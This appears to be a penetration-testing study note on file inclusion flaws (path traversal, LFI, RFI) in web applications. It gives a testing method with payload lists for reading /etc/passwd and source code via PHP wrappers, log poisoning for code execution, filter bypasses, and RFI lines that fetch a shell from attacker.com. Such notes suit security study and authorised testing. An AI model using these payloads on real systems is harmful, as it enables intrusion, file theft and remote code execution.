# File Inclusion

File inclusion vulnerabilities let an attacker trick a web application into exposing or executing a file that was never meant to be.

Why does it happen? It is because there isn't enough input validation. if the user can modify or abuse a file-handling function then an attacker can access unintended files.
A common language to have this vulnerability would be PHP, Python or Node.js.

If the attacher can include or upload a file with embedded PHP they can achieve remote code execution through Local File Inclusion (LFI).
If the application allows including files from an external server, the attacker c  n host their own malicious file and have the server execute it. (Remote File Inclusion)
It is usually the most critical outcome.

## Path Traversal

Path traversal allows the user to read files on the server outside the web application's root directory.

## Local File Inclusion (LFI)

If a file is passed through a language function like PHP's `include()`, it executes any code inside the file before returning the output. 
Under the right conditions, it can lead to remote code execution rather than just information disclosure.
There are lots of ways to prevent LFI, but there is always a way to use this vulnerability. The easiest way is to read the message errors and figure out how the `include()`has been secured.
It is can be by securing the path or blocking certains types of character such as `../`.

## Remote File Inclusion (RFI)

Instead of pointing the `include()`function at a local file, the attacker points it at a file posted on a server he controls.
requirements: a PHP configuration that allows url and fopen enabled (enabled by default) so that include() can accept urls.

## Methodology to test file inclusions

### 1. Find Candidates
Params like `page`, `file`, `template`, `path`, `lang`, `view`.

### 2. LFI Payloads
../../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
../../../etc/passwd%00

php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=config.php
data://text/plain;base64,<payload>
expect://id

### 3. Targets
- Linux: /etc/passwd, /proc/self/environ, /var/log/apache2/access.log
- Windows: C:\Windows\win.ini

### 4. Log Poisoning (RCE)
Inject PHP via User-Agent/Referer header → include log file to execute.

### 5. RFI Payloads (needs allow_url_include)
http://attacker.com/shell.txt
//attacker.com/shell.txt

### 6. Filter Bypasses
- `../` stripped → `....//`, `%252e%252e%252f`
- Required prefix → `images/../../etc/passwd`
- Required suffix → null byte, wrapper tricks
- WAF keyword → case/encoding variation

### 7. Tools
Burp Intruder + SecLists (Fuzzing/LFI), ffuf, wfuzz, fimap, Kadimus

### 8. Confirm
Successful read of known sensitive file = confirmed LFI
